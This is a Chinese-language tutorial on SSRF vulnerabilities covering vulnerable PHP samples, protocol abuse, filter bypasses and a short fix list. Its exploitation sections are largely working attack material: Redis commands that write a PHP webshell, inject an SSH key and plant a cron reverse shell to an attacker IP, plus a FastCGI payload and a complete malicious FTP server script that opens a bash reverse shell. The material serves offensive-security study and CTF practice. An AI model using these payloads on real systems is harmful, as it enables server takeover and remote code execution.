### 0x01 SSRF漏洞基础

## 1.1 简介

SSRF(Server-Side Request Forgery,服务器请求伪造)是一种由攻击者伪造请求，通过服务器发起请求的安全漏洞。

SSRF的攻击目标：公网无法直接访问的内网系统。（因为请求是服务端发起的，所以服务端能够请求到与自身相连而与外界断开的内部系统）

## 1.2 原理

SSRF漏洞的形成原因：服务端提供了从内网服务器请求数据的功能，但是 对目标地址的过滤和限制没有严格。

SSRF分为有回显和没有回显。

在php中一般导致ssrf的函数：`file_get_contents()、fsockopen()、curl_exec()`

### 2.1 `file_get_contents`



```php
<?php
if(isset($_POST[‘url’]))
{
$content=file_get_contents($_POST[‘url’]);
$filename=’./images/‘.rand().’;img1.jpg’;
file_put_contents($filename,$content);
echo $_POST[‘url’];
$img=”<img src=\"".$filename."\"/>“;
}
echo $img;
?>
```



### 2.2 `fscockopen()`

用于打开一个网络连接或者是一个UNix套接字连接，初始化一个套接字连接到指定的主机，实现对用户指定URL数据的获取。

该函数会使用socket跟服务器建立tcp连接进行传输原始数据。

```php
<?php
$host=$_GET[‘url’];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo “$errstr ($errno)<br />\n”;
} else {
    $out = “GET / HTTP/1.1\r\n”;
    $out .= “Host: $host\r\n”;
    $out .= “Connection: Close\r\n\r\n”;
    fwrite($fp, $out);
while (!feof($fp)) {
    echo fgets($fp, 128);
}
    fclose($fp);
}
?>
```

### 2.3 `curl_exec()`

初始化一个新的会话返回一个cURL句柄。

```php
<?php
    if(isset($_POST[‘url’])){
        $link = $_POST[‘url’];
        $curlobj=curl_init();
        curl_setopt($curlobj,CURLOPT_POST,0);
        curl_setopt($curlobj,CURLOPT_RETURNTRANSFER,TRUE);
        curl_setopt($curlobj,CURLOPT_URL,$link);
        $result=curl_exec($curlobj);
        curl_close($curlobj);
        $filename=’../images/‘.rand().’.jpg’;
        file_put_contents($filename,$result);
        $img=”<img src=\"".$filename."\"/>“;
        echo $img;
    }?>
```

## 1.3 漏洞利用

- 主要危害
  1. 对外网、服务器所在内网、本地进行端口扫描，获取一些服务器的信息。
  2. 攻击运行在内网或本地的应用程序(比如溢出)
  3. 对内网Web应用进行指纹识别，通过访问默认文件实现
  4. 攻击内外网的Web应用，主要是使用GET参数就可以实现的攻击
  5. 利用file协议读取本地文件

### 3.1 利用协议

#### 3.1.1 `file`

- 读取本地文件
  - `file:///var/www/html/flag.php`

#### 3.1.2 `dict`

利用dict协议可以查看本机或者是内网的端口开放信息

```
dict://127.0.0.1:22/info
```

#### 3.1.3 `gopher`

Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；

![img](assets/1658385365408-26274f3b-2cc7-42a9-81d7-478563023ecb.png)

**使用方式:**`gopher://<host>:<port>/<gopher-path>_TCP数据流`

#### 3.1.4 `FTP`



#### 3.1.5 `HTTP`

访问内网的web服务

## 1.4 SSRF绕过

### 4.1 @绕过

URL的完整格式是

```plain
[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]
```



根据url的结构`http://user:pass@ip/...`加上@前面的内容会被认为是用户名和密码信息

### 4.2 ip地址绕过/进制绕过

```plain
省略0：127.1
2进制格式:11000000101010000000000000000001
8进制格式：0300.0250.0.1
16进制格式：0xC0.0xA8.0.1
10进制整数格式：3232235521
16进制整数格式：0xC0A80001
```

### 4.3 302跳转/重定向

当网站代码实现了302跳转，我们可以利用这个跳转去执行某些网页。

自己编写一个php页面，然后通过访问这个页面实现跳转

```php
<?php
header("Location:http://127.0.0.1/flag.php");
?>
```

或者是利用短链接实现跳转

1. [TINYURL](https://tinyurl.com/app/myurls)生成一个短URL
2. 访问短URL实现跳转

### 4.4 利用最多的协议

```php
file:///
dict://
sftp://
ftp://
tftp://
ldap://
gopher://
..
zip://
bzip2://
zlib://
data://
```

### 4.5 添加端口绕过匹配

有些网站可能匹配过滤的是127.0.0.1，但是增加上端口127.0.0.1:80有可能达到绕过的目的。

### 4.6 利用域名绕过

```java
xip.io
nip.io
sslip.io
利用句号。
有些可以直接添加80端口绕过
```

### 4.7 利用Enclosed alphanumerics绕过

你能在这个[网站](https://www.mp51.vip/Code/AllUniCode?quwei=2460-24FF)看到这个字符合集，挑选合适的字符就行

```plain
https://ⓦⓦⓦ.ⓔⓣⓔsⓣⓔ.ⓒⓄⓜ/是完全等同于https://www.eteste.com/
```

### 4.8 特殊方法

```plain
http://[::]:80/ http://0000::1:80/http://0/
```

### 4.9 DNS 重绑定     

## 0x05修复方案

1.  取URL的Host   
2.  取Host的IP 
3.  判断是否是内网IP，是内网IP直接return，不再往下执行
   请求URL 
4.  如果有跳转，取出跳转URL，执行第1步 
5.  正常的业务逻辑里，当判断完成最后会去请求URL，实现业务逻辑。 

# 0x02 Redis利用

## 2.1 利用方式

利用TCPdump简单转一个写shell的请求包来分析一下

我们可以发现每一个字符串上面都有一个`$number` 这个number是字符串的长度，可是在上面还有一个`*number`这个number似乎代表根据空格分隔（用引号括起来不算）开的数组的元素个数。

那还有其它的吗？这我们就要引入redis服务器和客户端通信的协议`RESP`

```plain
在RESP中，某些数据的类型取决于第一个字节：
对于Simple Strings，回复的第一个字节是+
对于error，回复的第一个字节是-
对于Integer，回复的第一个字节是:
对于Bulk Strings，回复的第一个字节是$
对于array，回复的第一个字节是*
此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。
在RESP中，协议的不同部分始终以"\r\n"(CRLF)结束。
```

数据类型以不同的符号区分开，后面跟数字表示个数。

**简单的利用环境**

```php
<?php
    highlight_file(__FILE__);
    $url = $_GET['url'];
    $curl = curl_init($url);    
    /*进行curl配置*/
    curl_setopt($curl, CURLOPT_HEADER, 0); // 不输出HTTP头
    $response = curl_exec($curl);
    echo $response;
    curl_close($curl);
?>
```

在redis绑定在`0.0.0.0:6379`暴露在公网且处于默认配置密码为空的情况下，攻击者可以直接连接进行通信。

在3.2之后，配置文件中`/etc/redis/redis.conf`的新增有两个选项

```plain
1.bind 127.0.0.1 ::1  #只允许通过本地登录      
2.procted-mode #如果没有配置bind 只有启动redis服务的机器登录
```



注释掉第一句，将第二句修改为no，即可复现该漏洞。

### 2.1.1 写入webshell

```plain
flushall   #清空所有键值对 （慎用）
config set dir /var/www/html #设置备份文件目录
config set dbfilename shell.php  #设置备份文件名称
set webshell "<?php eval($_POST[1]);?>" #写入一条数据
save #保存
```

-  利用dict协议

当时`?`会被截断导致无法写入，所以可以利用16进制编码、`setbit`、`bitop`绕过进行写入

-  完整的利用思路 

- - 首先

​	`?url=dict://127.0.0.1:6379/config set dir /var/www/html`  设置路径为/var/www/html 

- - 第二步

​	`?url=dict://127.0.0.1:6379/config set dbfilename shell.php`  设置备份数据库文件为shell.php 

- -  第三步
    `?url=dict://127.0.0.1:6379/set 1 "<?php eval($_POST[1]);?>"`   问号会被截断所以这一步需要利用一些绕过方式，同时也要注意单引号和双引号。 
  -  第四步
    `?url=dict://127.0.0.1:6379/save`：保存到文件 

### 2.1.2 写ssh公钥

如果`.ssh`目录存在，则直接写入`~/.ssh/authorized_keys`
如果不存在，则可以利用`crontab`创建该目录



```plain
flushall
set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
'
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

### 2.1.3 写定时任务 计划反弹shell

利用定时任务反弹shell 这个利用只对于centos有效。因为保存后会带有脏数据，在ubuntu上会报错。一般是只能在centos上利用这个方法。

```plain
ubuntu：/var/spool/cron/crontabs/<username>

centos: /var/spool/cron/<username>
```

权限问题，定时文件位置不同

```plain
flushall
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.163.132/2333 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save
```

# 0x03 MySQL利用

## 3.1 intro

MySQL数据库连接有三种方法：

```plain
Unix套接字
内部共享/命名管道
TCP/IP套接字
```

Linux或Unix环境，`mysql -uroot -proot`登录MySQL服务器就是用的Unix套接字

在windows系统中客户端和mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式

TCP/IP套接字是在任何系统下都可以使用的方式`mysql -h 127.0.0.1 -u root -proot`

# 0x04 FastCGI

## 4.1 Intro

### 1.`CGI` 

CGI模式下，PHP是一个独立的进程比如php-cgi.exe,Web服务器也是一个独立的进程比如apache.exe。

当Web服务器监听到HTTP请求时，会调用php-cgi进程通过cgi协议，服务器将请求内容转换成php-cgi能够解释的协议传递给cgi进程，cgi进程拿到内容解析对应的php文件返回给web服务器通过web服务器在返回到客户端。

每次客户端请求都需要建立和销毁进程，因为HTTP要生成一个动态页面，系统就必须启动一个新的cgi进程。

### 2.`Fast-CGI` 

Fastcgi是服务器中间件和某个语言后端进行数据交换的协议，Fastcgi协议由多个record组成，record由header和body组成。

服务器中间件将header和body按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据进行指定操作，并将结果按照该协议封装好后返回给服务器中间件。

-  `header` 

- - 固定8字节由8个`uchar`类型的变量组成，每个变量1字节。
  - `requestId`占两个字节，一个唯一的标志id，避免多个请求之间的影响.
  - `contentLength`占两个字节表示`body`大小 

- - - 语言端解析了`fastcgi`头获取到`contentLength`在TCP流中读取大小等于`contentLength`的数据为`body`.
    - `body`后还有一段额外的数据`Padding`长度由头中的`paddingLength`指定，作为保留作用，不需要的时候指定长度为0就行。

- - 一个`Fastcgi record`结构最大支持body大小是`2^16=65536`

-  `FastCGI Type` 

- -  `Type`是指定`Record`的作用。 

- - - 在`fastcgi`中一个`record`的大小是有限的
    - 作用也是为单一的
    - 所以需要在一个TCP流中传递多个`record`
    - 通过type来标志每个`record`的作用
    - 利用`requestId`作为请求的`Id`

-   

| type值 | 主要含义                                                     |
| ------ | ------------------------------------------------------------ |
| 1      | 在与php-fpm建立连接之后发送的第一个消息中的type值就得为1，用来表明此消息为请求开始的第一个消息 |
| 2      | 异常断开与php-fpm的交互                                      |
| 3      | 在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束 |
| 4      | 在交互过程中给php-fpm传递环境参数时，将type设为此，以表明消息中包含的数据为某个name-value对 |
| 5      | web服务器将从浏览器接收到的POST请求数据(表单提交等)以消息的形式发给php-fpm,这种消息的type就得设为5 |
| 6      | php-fpm给web服务器回的正常响应消息的type就设为6              |
| 7      | php-fpm给web服务器回的错误响应设为7                          |

- -  根据一下四种规则又会选取不同的解析模式 

- - - key、value均小于128字节，用`FCGI_NameValuePair11`
    - key大于128字节，value小于128字节，用`FCGI_NameValuePair41`
    - key小于128字节，value大于128字节，用`FCGI_NameValuePair14`
    - key、value均大于128字节，用`FCGI_NameValuePair44`

-  `PHP-FPM`
  ![img](assets/1658385465482-93f73250-2262-4317-9baf-ef826f3f1f0d.png) 

- -  `php-fpm`是一个实现和管理`fastcgi`协议的进程。 
  -  `fastcgi`模式的内存管理功能是由`php-fpm`进程实现的。 

- - - 本质上`fastcgi`模式也是对cgi模式做了一个封装，只是从原来的web服务器调用cgi程序变成了web服务器通知`php-fpm`进程并由`php-fpm`进程去调用`php-cgi`程序。
    - `fpm`其实是一个`fastcgi`协议解析器。
    - 进程 

- - - - master进程 

- - - - - 只有一个，负责监听端口，接受来自Web Server的请求

- - - - worker进程 

- - - - - 存在多个，进程内嵌入一个PHP解释器，是PHP代码真正执行的地方

- -  `nginx`服务器中间件将用户请求按照`fastcgi`的规则打包好通过TCP传给FPM，FPM按照`fastcgi`协议将TCP流解析成真正的数据。 
  -  例如简单访问http://127.0.0.1/index.php?a=1&b=2，如果web目录是`/var/www/html`通过`NGINX`处理会变成一下键值对发送给`FastCGI`. 

- - - Nginx无法直接与 FastCGI 进行通信，需要启用 `ngx_http_fastcgi_module` 模块进行代理配置，才能将请求发送给 FastCGI 服务。

```nginx
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```

## 4.2 利用

### 1.PHP未授权漏洞



因为CGI在处理请求的时候会将需要执行的文件打包进FastCGI协议中保存形式为:`'SCRIPT_FILENAME': '/var/www/html/index.php'`.



PHP-FPM不会执行这个文件,但是如果我们能够**控制这个**`**SCRIPT_FILENAME**`**键的值**的话 不就可以指定执行任意php文件？



-  在PHP 5.3.9 之前 可以执行任意已经存在的文件 
-  PHP5.3.9 之后 因为增加了`security.limit_extensions`安全选项，导致只能控制PHP-FPM执行`php34567`这些后缀的文件，且必须找到一个**存在的文件。** 



Nginx会先将请求中的一些重要的信息打包成环境变量发送给PHP-FPM处理，那么我们可以利用的有哪些呢？



我们可以利用到PHP.INI中一些有趣的配置。



`auto_prepend_file` 在执行文件之前，先包含`auto_prepend_file`中的指定文件



`auto_append_file` 在执行文件之后，包含`auto_append_file`中指向的文件



`PHP_VALUE` 设置PHP设置项 允许`PHP_INI_USER`和`PHP_INI_ALL`的选项



`PHP_ADMIN_VALUE` 允许设置所有选项。



所以利用思路就很明确了:



-  我们需要有一个已经存在的PHP脚本文件且知道绝对路径 
-  利用`PHP_VALUE_USER`修改`auto_prepend_file=php://input`  那么在PHP解析器解析这个文件的时候会先包含POST的请求的内容。 
-  因为使用到`php://input`协议，所以我们可以利用`php_admin_value`开启`allow_url_include` 



最后可以构造出来的请求包为：



```php
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```



**利用思路**:因为PHP-FPM暴露在公网我们可以直接与它通信，通过伪造发送一个包含恶意配置的请求包直接给fpm解析。



### 2.SSRF利用FPM/FastCGI

**利用前提:**

- PHP-FPM没有暴露在公网
- 存在一个SSRF漏洞

利用Gopher协议攻击内网中的PHP-FPM服务

什么是Gopher协议？

Gopher是一个信息查找系统，支持发出GET请求和POST请求。[Gopherus](https://github.com/tarunkant/Gopherus)直接生成Payload就可以。

**利用思路**:主要还是能够直接和PHP-FPM通信的问题，伪造的数据包直接交由fpm处理。

### 3.FTP-SSRF攻击FPM/FastCGI

```php
<?php
$contents = file_get_contents($_GET['viewFile']);
file_put_contents($_GET['viewFile'], $contents);
```

`file_get_contents`不支持gopher协议，但是支持ftp协议，根据这个特性我们可以利用ftp的被动模式

```plain
# -*- coding: utf-8 -*-
# @Time    : 2021/1/13 6:56 下午
# @Author  : tntaxin
# @File    : ftp_redirect.py
# @Software:

import socket
from urllib.parse import unquote

# 对gopherus生成的payload进行一次urldecode，不需要前面那一段，因为不是直接对FPM攻击了..
payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.116.132/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")

payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    conn.send(b"200 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    if count == 1:
        conn.send(b"220 ready\n")
    else:
        conn.send(b"200 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
    if count == 1:
        conn.send(b"215 \n")
    else:
        conn.send(b"200 \n")

    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
    if count == 1:
        conn.send(b"213 3 \n")  
    else:
        conn.send(b"300 \n")

    print(conn.recv(20))  # EPSV\r\n'
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        conn.send(b"227 192,168,116,132,4,210\n")  #服务端告诉客户端需要到ip获取数据，其中端口的计算规则为：4*256+210=1234
    else:
        conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        conn.send(b"150 \n")
        print(conn.recv(20))
        exit()

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        conn.send(b"226 \n")
    conn.close()
    count += 1
```

**原理：**

1. `file_get_contents`通过ftp协议访问指定的ftp服务器下载文件
2. `file_put_contents`传回ftp服务器文件指定，在客户端中搜索并解析,第一次将请求发送到PHP-fpm中，然后php-fpm执行代码.

那么对于无法写入一个文件的情况呢？

这个漏洞还可以简化成

```php
file_get_contents($_GET['file'],$_GET['data']);
```

还是老方法，我们需要搭一个恶意的ftp服务，利用本地去访问这个服务，然后反弹shell

```plain
# evil_ftp.py
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```